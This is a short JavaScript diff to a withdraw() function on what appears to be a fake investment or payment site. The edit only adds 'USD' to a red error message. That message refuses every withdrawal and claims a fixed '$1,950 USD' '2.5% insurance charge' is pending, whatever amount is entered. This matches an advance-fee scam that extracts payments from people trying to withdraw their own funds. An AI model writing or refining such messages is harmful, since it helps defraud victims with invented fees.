@@ -232,7 +232,7 @@ function withdraw() {
   // ✅ Show message
   messageEl.style.color = "#fc0f03";
   messageEl.innerText =
-    `Withdrawal request of ${amount} is not processed due to pending payment of 2.5% insurance charge $1,950 USD.`;
+    `Withdrawal request of ${amount}USD is not processed due to pending payment of 2.5% insurance charge $1,950 USD.`;
 
   // ✅ Clear inputs
   document.getElementById("number").value = "";
